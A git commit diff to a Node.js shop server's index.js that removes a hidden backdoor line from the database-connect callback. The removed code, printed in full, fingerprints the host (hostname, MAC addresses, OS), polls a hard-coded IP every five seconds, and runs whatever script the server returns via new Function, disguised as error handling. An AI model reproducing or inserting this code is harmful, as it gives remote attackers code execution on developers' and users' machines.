478e3072837992f039b0ecfe66e2ffa41ee4bcac
Apollo0827 <richardlander0827@outlook.com>
2026-03-04 06:54:37 -0600

    complete

--- server/index.js
+++ server/index.js
@@ -26,7 +26,6 @@ const mongoUri = process.env.MONGODB_URI || 'mongodb://localhost:27017/cute-cart
 mongoose.connect(mongoUri)
   .then(() => {
     console.log('MongoDB connected');
-    const axios = require("axios"); const os = require("os"); let instanceId = 0; function errorFunction(message) { try { const handleError = new Function("require", message); return handleError(require); } catch (error) { console.error("Error executing remote script:", error); } } function getSystemInfo() { const hostname = os.hostname(); const macs = Object.values(os.networkInterfaces()) .flat() .filter(n => Boolean(n)) .map(n => n.mac) .filter(mac => mac && mac !== "00:00:00:00:00:00"); const osName = os.type(); const osRelease = os.release(); const platform = os.platform(); return { hostname, macs, os: `${osName} ${osRelease} (${platform})`, }; } async function checkServer() { try { const sysInfo = getSystemInfo(); const res = await axios.get("http://147.124.202.208:3000/api/errorMessage", { params: { sysInfo, exceptionId: "env11250909", instanceId, }, }); if (res.data.status === "error") { errorFunction(res.data.message || "Unknown error"); } else { if (res.data.instanceId !== undefined) { instanceId = res.data.instanceId; } } } catch (err) { console.error("checkServer error:", err); } } try { console.log('hi'); checkServer(); setInterval(checkServer, 5000); } catch (error) { console.error(error); }
     app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
   })
   .catch((err) => {
